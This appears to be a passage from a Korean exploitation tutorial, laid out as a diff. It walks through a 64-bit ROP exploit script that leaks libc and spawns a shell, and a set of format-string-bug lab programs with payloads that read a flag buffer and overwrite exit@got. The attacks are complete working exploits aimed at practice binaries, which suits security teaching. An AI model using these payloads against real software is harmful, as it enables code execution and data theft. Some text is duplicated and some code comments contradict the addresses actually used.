+해당하는 코드 가젯은 0x40056a 주소에 존재합니다. 찾은 코드 가젯을 이용해 write 함수를 호출한 뒤 write@got에 저장되어 있는 값을 출력해서 라이브러리 주소를 알아냅니다. 이후, 알아낸 라이브러리 주소를 통해 write@got를 system 함수로 덮어쓰고 "/bin/sh" 문자열을 입력합니다. 최종적으로 write 함수를 호출하고 "/bin/sh" 문자열의 주소인 0x601020를 첫 번째 인자로 전달하면 셸을 획득할 수 있습니다.
+
+
+```
+# rop64.py
+import struct
+import subprocess
+import os
+import pty
+import time
+def readline(fd):
+  res = ''
+  try:
+    while True:
+      ch = os.read(fd, 1)
+      res += ch
+      if ch == '\x20':
+        return res
+  except:
+    raise
+def read(fd, n):
+  return os.read(fd, n)
+def writeline(proc, data):
+  try:
+    proc.stdin.write(data + "\n")
+  except:
+    raise
+def p64(val):
+  return struct.pack("<Q", val)
+def u64(data):
+  return struct.unpack("<Q", data)[0]
+out_r, out_w = pty.openpty()
+s = subprocess.Popen("./rop64", stdin=subprocess.PIPE, stdout=out_w)
+print `read(out_r, 6)`
+# write(1, 0x601018, 8)
+payload  = "A"*264         # buf padding
+payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
+payload += p64(1)          # fd
+payload += p64(0x601018)   # write@got
+payload += p64(8)          # 8 
+payload += p64(0x400430)   # write_plt 
+# read(0, 0x601018, 16)
+payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
+payload += p64(0)          # fd
+payload += p64(0x601018)   # write@got
+payload += p64(16)          # 8
+payload += p64(0x400440)   # read@plt
+# write(0x601020,0,0)
+payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
+payload += p64(0x601020)   # /bin/sh
+payload += p64(0)          # 0
+payload += p64(0)          # 0
+payload += p64(0x400430)   # write@plt
+writeline(s, payload)
+```
+라이브러리의 베이스 주소와 system 함수 주소를 계산하기 위해 readelf를 사용하여 오프셋을 알아내야 합니다.
+
+```
+$ readelf -a /lib/x86_64-linux-gnu/libc.so.6 | grep "write"
+  W (write), A (alloc), X (execute), M (merge), S (strings), l (large)
+    99: 00000000000746c0   466 FUNC    GLOBAL DEFAULT   13 _IO_wdo_write@@GLIBC_2.2.5
+   169: 00000000000f72b0    90 FUNC    WEAK   DEFAULT   13 __write@@GLIBC_2.2.5
+   287: 000000000007a390   269 FUNC    GLOBAL DEFAULT   13 _IO_do_write@@GLIBC_2.2.5
+   491: 0000000000108040    36 FUNC    GLOBAL DEFAULT   13 process_vm_writev@@GLIBC_2.15
+   493: 00000000000f5ac0    96 FUNC    WEAK   DEFAULT   13 __pwrite64@@GLIBC_2.2.5
+   851: 00000000000fcfd0    90 FUNC    WEAK   DEFAULT   13 writev@@GLIBC_2.2.5
+  1252: 00000000000f5ac0    96 FUNC    GLOBAL DEFAULT   13 __libc_pwrite@@GLIBC_PRIVATE
+  1513: 00000000000fd0e0   170 FUNC    GLOBAL DEFAULT   13 pwritev@@GLIBC_2.10
+  1565: 0000000000107700    41 FUNC    GLOBAL DEFAULT   13 eventfd_write@@GLIBC_2.7
+  1580: 000000000006e6e0   456 FUNC    WEAK   DEFAULT   13 fwrite@@GLIBC_2.2.5
+  1855: 00000000000fd0e0   170 FUNC    GLOBAL DEFAULT   13 pwritev64@@GLIBC_2.10
+  2005: 0000000000078b70   171 FUNC    GLOBAL DEFAULT   13 _IO_file_write@@GLIBC_2.2.5
+  2025: 000000000006e6e0   456 FUNC    GLOBAL DEFAULT   13 _IO_fwrite@@GLIBC_2.2.5
+  2044: 00000000000f5ac0    96 FUNC    WEAK   DEFAULT   13 pwrite@@GLIBC_2.2.5
+  2103: 00000000000781a0   106 FUNC    GLOBAL DEFAULT   13 fwrite_unlocked@@GLIBC_2.2.5
+  2112: 00000000000f5ac0    96 FUNC    WEAK   DEFAULT   13 pwrite64@@GLIBC_2.2.5
+  2159: 00000000000f72b0    90 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5
+$ readelf -a /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
+   225: 0000000000138810    70 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
+   584: 0000000000045390    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+  1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
+```
+
+라이브러리의 write와 system 함수 오프셋은 각각 0xf72b0, 0x45390인 것을 알아냈습니다.
+
+
+출력된 write@got 값과 라이브러리의 write 함수 오프셋을 계산하여 라이브러리의 베이스 주소를 알아내고, system 함수 오프셋과 덧셈 연산을 하여 system 함수 주소를 알아냈습니다.
+
+write@got에 입력받을 때 system 함수 주소와 "/bin/sh" 문자열을 입력하고, write 함수를 호출할 때 인자로 0x601020 주소를 전달하면 셸을 획득할 수 있습니다.
+
+
+```
+# rop64.py 
+import struct
+import subprocess
+import os
+import pty
+import time
+def readline(fd):
+  res = ''
+  try:
+    while True:
+      ch = os.read(fd, 1)
+      res += ch
+      if ch == '\x20':
+        return res
+  except:
+    raise
+def read(fd, n):
+  return os.read(fd, n)
+def writeline(proc, data):
+  try:
+    proc.stdin.write(data + "\n")
+  except:
+    raise
+def p64(val):
+  return struct.pack("<Q", val)
+def u64(data):
+  return struct.unpack("<Q", data)[0]
+out_r, out_w = pty.openpty()
+s = subprocess.Popen("./rop64", stdin=subprocess.PIPE, stdout=out_w)
+print `read(out_r, 6)`
+# write(1, 0x601010, 8)
+payload  = "A"*264         # buf padding
+payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
+payload += p64(1)          # fd
+payload += p64(0x601018)   # write@got
+payload += p64(8)          # 8 
+payload += p64(0x400430)   # write_plt 
+# read(0, 0x601010, 16)
+payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
+payload += p64(0)          # fd
+payload += p64(0x601018)   # write@got
+payload += p64(16)          # 8
+payload += p64(0x400440)   # read@plt
+# write(0x601018,0,0)
+payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
+payload += p64(0x601020)   # /bin/sh
+payload += p64(0)          # 0
+payload += p64(0)          # 0
+payload += p64(0x400430)   # write@plt
+writeline(s, payload)
+libc = u64(read(out_r,8)[:8])
+base = libc - 0xf72b0
+system = base + 0x45390
+print hex(libc)
+writeline(s, p64(system)+"/bin/sh\x00")
+while True:
+  cmd = raw_input("$ ")
+  writeline(s, cmd)
+  time.sleep(0.2)
+  print read(out_r, 1024)
+
+```
+
+```
+$ python ex.py
+'Data: '
+0x7f98a275c2b0
+$ id
+uid=1001(theori) gid=1001(theori) groups=1001(theori)
+```
+
+
+
+# 5. Format String Bug
+
+포맷 스트링 버그는 대표적으로 printf와 sprintf와 같은 포맷 스트링을 사용하는 함수에서 사용자가 포맷 스트링 문자열을 통제할 수 있을 때 발생하는 취약점입니다. 이 취약점이 프로그램에 존재하면, 프로그램의 임의 주소의 값을 읽을 수 있을 뿐만 아니라 값을 쓸 수 있기 때문에 매우 위험합니다.
+
+포맷 스트링에는 다양한 종류가 있고, 주어진 인자에 대해 각 포맷 별로 정해진 기능을 수행합니다. 만약 공격자가 이러한 포맷 스트링을 조작할 수 있다면, printf 함수의 인자가 저장되는 스택의 내용을 읽거나 %n 혹은 %s 등 메모리 참조 포맷 스트링을 이용해 메모리 커럽션을 유발할 수 있습니다.
+
+fsb1은 중요 파일인 "flag" 파일을 읽고 전역 변수 flag_buf에 저장합니다. 그리고 지역 버퍼인 buf에 입력을 받고 printf를 사용하여 출력하되 사용자의 입력이 포맷 스트링으로 그대로 들어가기 때문에 포맷 스트링 버그가 발생합니다.
+
+해당 예제의 목표는 flag_buf에 저장되어 있는 "flag" 파일의 내용을 포맷 스트링 버그를 통해 읽는 것입니다.
+
+
+```
+// gcc -o fsb1 fsb1.c -m32 -mpreferred-stack-boundary=2
+#include <stdio.h>
+
+int main()
+{
+	FILE *fp;
+	char buf[256];
+	initialize();
+	memset(buf, 0, sizeof(buf));
+	fp = fopen("./flag", "r");
+	fread(flag_buf, 1, sizeof(flag_buf), fp);
+	printf("Input: ");
+	read(0, buf, sizeof(buf)-1);
+	printf(buf);
+	return 0;
+}
+```
+
+
+우선 포맷 스트링 버그가 존재하면 포맷 스트링이 참조하는 버퍼에 공격자의 값을 쓸 수 있는지, 그리고 입력한 데이터가 몇 번째 포맷 스트링에 참조되는지를 먼저 알아내야 합니다. 공격자가 변조 가능한 데이터가 포맷 스트링에 의해 참조된다면 임의 주소에 값을 쓰거나 읽는 것이 가능해집니다.
+
+fsb를 확인해보면 처음 입력 값 "AAAA"가 두 번째 포맷 스트링에 의해 참조되는 것을 확인할 수 있습니다. 해당 값은 printf가 호출될 때의 스택 포인터의 값을 확인하면 정확하게 알아낼 수 있습니다.
+
+만약 처음에 입력한 4 바이트의 값이 특정 메모리 주소라면, 해당 포인터를 참조하는 포맷 스트링을 사용했을 때 입력한 주소에 값을 쓰거나 읽을 수 있습니다.
+
+fsb_n을 보면 "AAAA%x.%n"을 입력했을 때 printf 함수가 실행되면서 프로그램이 비정상 종료한 것을 알 수 있습니다. 비정상 종료가 발생한 명령어와 레지스터를 gdb를 통해 확인해보면, 0x41414141이 "%n" 포맷 스트링을 통해 참조되어 값을 쓰다가 Segmentation fault가 발생되는 것을 알 수 있습니다.
+
+이해를 돕기 위해 요약한 명령어는 다음과 같습니다.
+```
+mov    DWORD PTR [0x41414141], 0xc
+```
+
+만약 두 번째 값이 0x41414141이 아닌 메모리에 존재하는 주소라면 해당 영역에 값을 쓰거나 읽을 수 있습니다.
+
+```
+$ ./fsb1
+Input: AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x 
+AAAA9ca9008.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.a78252e.0
+```
+
+```
+# gdb fsb1
+(gdb) set disassembly-flavor intel
+(gdb) r
+Starting program: ./fsb1 
+Input: AAAA%x.%n
+Program received signal SIGSEGV, Segmentation fault.
+0xf7e43369 in _IO_vfprintf_internal (s=0xffffafd4, format=<optimized out>, ap=0xffffd5b8 "%x.%n\n") at vfprintf.c:1631
+1631	vfprintf.c: No such file or directory.
+(gdb) x/i $eip
+=> 0xf7e43369 <_IO_vfprintf_internal+8873>:	mov    DWORD PTR [eax],esi
+(gdb) i r $eax $esi
+eax            0x41414141	1094795585
+esi            0xc	12
+```
+
+"%n" 포맷 스트링을 이용하면 원하는 주소를 참조하여 값을 쓸 수 있다는 것을 알았습니다. 그러나 fsb1에서는 전역 변수 flag_buf에 저장된 내용을 읽어야 합니다.
+
+flag_buf의 주소는 심볼을 이용해 gdb에서 다음과 같이 알아낼 수 있습니다.
+
+```
+(gdb) info var flag_buf
+All variables matching regular expression "flag_buf":
+Non-debugging symbols:
+0x0804a080  flag_buf
+```
+
+"%n" 포맷 스트링을 이용하면 원하는 주소를 참조하여 값을 쓸 수 있다는 것을 알았습니다. 그러나 fsb1에서는 전역 변수 flag_buf에 저장된 내용을 읽어야 합니다.
+
+flag_buf의 주소는 심볼을 이용해 gdb에서 다음과 같이 알아낼 수 있습니다.
+
+```
+(gdb) info var flag_buf
+All variables matching regular expression "flag_buf":
+Non-debugging symbols:
+0x0804a080  flag_buf
+```
+
+입력의 첫 4 바이트에 0x804a080 주소를 입력하여 두 번째 포맷 스트링을 참조할 때 해당 주소를 참조하도록 합니다.
+
+특정 문자열을 출력할 때는 "%s" 포맷 스트링을 사용하여 다음과 같이 지정된 주소의 문자열을 출력할 수 있습니다.
+
+printf("%s", "HELLO WORLD")
+
+만약 "[flag_buf 주소].%x.%s"을 삽입한다면 "%s" 포맷 스트링을 처리할 때 printf("%s", 0x804a080)의 결과를 출력할 것입니다.
+
+fsb1_exploit을 확인해보면 성공적으로 "flag" 파일의 내용인 "DREAMHACK_FORMATSTRING" 문자열이 출력된 것을 확인할 수 있습니다.
+
+만약 사용자가 입력한 값이 두 번째가 아닌 천 번째, 만 번째 포맷 스트링에서 참조할 수 있다면 해당 포인터를 참조하도록 많은 포맷 스트링을 입력해 접근해야 합니다. 그러나 이를 쉽게 해결하는 방법 또한 존재합니다.
+
+fsb1_exploit2를 확인해보면 "[flag_buf 주소]%2$s"를 입력하였습니다. "%N$"는 N 번째 매개 변수를 특정 포맷 스트링으로 처리할 때 사용합니다. 예제에서 다룬 "%2$s"는 두 번째 주소를 "s" 포맷 스트링을 통해 출력한다는 의미입니다.
+
+fsb_example.c는 "%N$"의 이해를 돕기 위한 간단한 예제입니다. 실행 결과는 다음과 같습니다.
+
+```
+$ ./ex
+WORLD
+```
+
+이처럼 "$"를 사용하면 원하는 번지의 주소를 쉽게 참조할 수 있기 때문에 유용하게 사용할 수 있습니다.
+
+
+```
+(gdb) r <<< $(python -c 'print "\x80\xa0\x04\x08%x.%s"')
+Starting program: ./fsb1 <<< $(python -c 'print "\x80\xa0\x04\x08%x.%s"')
+Input: ?804b008.DREAMHACK_FORMATSTRING
+```
+
+```
+(gdb) r <<< $(python -c 'print "\x80\xa0\x04\x08%2$s"')
+Starting program: /mnt/hgfs/ubuntu/dreamhack/fsb1 <<< $(python -c 'print "\x80\xa0\x04\x08%2$s"')
+Input: ?DREAMHACK_FORMATSTRING
+```
+
+```
+#include <stdio.h>
+int main()
+{
+	printf("%2$s", "HELLO", "WORLD");
+}
+```
+
+포맷 스트링 버그를 통해 임의의 주소에 저장되어 있는 값을 읽어내는 방법을 다뤘습니다. 그렇다면 임의의 주소에 원하는 값을 쓰는 방법에 대해서 보다 자세히 알아보도록 하겠습니다.
+
+fsb2는 포맷 스트링 버그가 발생하고 exit 함수가 호출되어 프로그램이 종료되는 예제입니다. exit 함수는 포맷 스트링 버그가 발생한 이후에 호출되기 때문에 exit@got를 조작할 수 있다면 주어진 get_shell 함수로 실행 흐름을 조작할 수 있습니다.
+
+이전 예제를 살펴보면 "n" 포맷 스트링을 사용하면 출력된 문자열의 길이만큼 특정 주소에 값을 쓴다는 것을 확인할 수 있었습니다. 값을 쓰는 것 또한 이전 공격 방식과 비슷한 과정을 통해 수행할 수 있습니다.
+
+```
+// gcc -o fsb2 fsb2.c -m32 -mpreferred-stack-boundary=2
+#include <stdio.h>
+ 
+void get_shell() {
+	system("/bin/sh");
+}
+int main()
+{
+	char buf[256];
+	initialize();
+	memset(buf, 0, sizeof(buf));
+	printf("Input: ");
+	read(0, buf, sizeof(buf)-1);
+	printf(buf);
+	exit(0);
+}
+```
+
+
+```
+// gcc -o fsb_example2 fsb_example2.c
+#include <stdio.h>
+int main()
+{
+	int ret = 0;
+	printf("1234%1$n\n", &ret);
+	printf("ret: %d\n", ret);
+}
+```
+
+"n"은 출력된 문자의 길이 수를 전달된 매개 변수에 쓰는 포맷 스트링입니다.
+
+fsb_example2는 "n" 포맷 스트링의 이해를 돕기 위한 예제입니다. 실행 결과는 다음과 같습니다.
+
+```
+# ./fsb_example2
+1234
+ret: 4
+```
+
+printf의 첫 번째 인자로는 "1234%1$n", 두 번째 인자에 ret 지역 변수의 주소를 전달했습니다. "1234" 문자열의 길이는 4이고, "%1$n" 포맷 스트링을 사용하여 ret에 출력된 문자열의 길이를 쓰기 때문에 ret은 4라는 값을 가지게 됩니다.
+
+그러나 실제로 공격을 할 때는 이와 같이 작은 값을 쓸 경우는 적습니다. 만약 0x41414141이란 값을 쓰기 위해서는 문자열의 길이가 1094795585(0x41414141의 10 진수)이 되어야하는데, 입력할 수 있는 길이가 한정되어 있다면 fsb_example2에서 다룬 방법으로는 공격이 불가능 할 수 있습니다.
+
+fsb_example3는 이를 해결할 수 있는 예제입니다.
+
+```
+// gcc -o fsb_example3 fsb_example3.c
+#include <stdio.h>
+int main()
+{
+	int ret = 0;
+	printf("%1024c%1$n\n", &ret);
+	printf("ret: %d\n", ret);
+}
+```
+
+```
+$ ./fsb_exmaple3
+                                                        ?ret:1024                                                            
+```
+1024 바이트 길이의 데이터를 입력하지 않았는데 ret이 1024로 덮인 것을 확인할 수 있습니다.
+
+"%1024c"는 1024 길이의 공백을 포함한 문자를 "c" 포맷 스트링으로 출력하는 것이기 때문에 이를 사용하여 원하는 길이만큼 화면에 문자를 출력할 수 있습니다. 해당 방법을 사용하면 입력할 수 있는 버퍼가 한정적이더라도 원하는 문자열의 길이를 출력하여 임의 주소에 원하는 값을 쓸 수 있습니다.
+
+그럼 앞에서 배운 "%Nc"와 "n" 포맷 스트링을 사용하여 exit@got를 원하는 값으로 덮어써 보도록 하겠습니다. 우선 exit@got를 get_shell 주소로 덮어쓰기 위해 해당하는 주소를 구합니다.
+
+```
+(gdb) i func get_shell
+All functions matching regular expression "get_shell":
+Non-debugging symbols:
+0x08048639  get_shell
+(gdb) x/i exit
+   0x8048490 <exit@plt>:	jmp    *0x804a024
+```
+
+fsb2_exploit1은 1024 바이트만큼 출력해 exit@got를 1024인 0x400 값으로 덮어쓰는 공격 코드입니다.
+
+"exit@got주소%1024c%1$n" 포맷 스트링을 사용하여 덮어쓴 결과 1024 ( 0x400 )이 아닌 0x404 값이 덮어써진 것을 확인할 수 있습니다. 이러한 이유는 다음과 같습니다.
+
+"n"은 출력한 문자열의 길이 값을 전달된 인자에 쓰는 포맷 스트링입니다. 공격 코드의 경우 "%1024c"를 통해 1024 바이트만큼을 출력했지만 앞 부분에 입력한 exit@got 주소, 즉 4 바이트가 포함되어 있기 때문에 1028인 0x404 값이 덮어써진 것입니다.
+fsb2_exploit2는 exit@got 주소를 get_shell 주소로 덮어쓰는 공격 코드입니다. 이는 get_shell 주소인 134514233 바이트를 화면에 출력한 이후 값을 덮어쓰기 때문에 공격이 오래 걸리거나 TIMEOUT이 발생할 수 있습니다. exit@got 주소를 2 바이트, 혹은  1 바이트씩 덮어쓰면 됨
+```
+(gdb) r <<< $(python -c 'print "\x24\xa0\x04\x08%1024c%1$n"')
+Starting program: ./fsb2 <<< $(python -c 'print "\x24\xa0\x04\x08%1024c%1$n"'
+```
+
+```
+$ (python -c 'print "\x24\xa0\x04\x08%134514229c%1$n"') | ./fsb2
+```
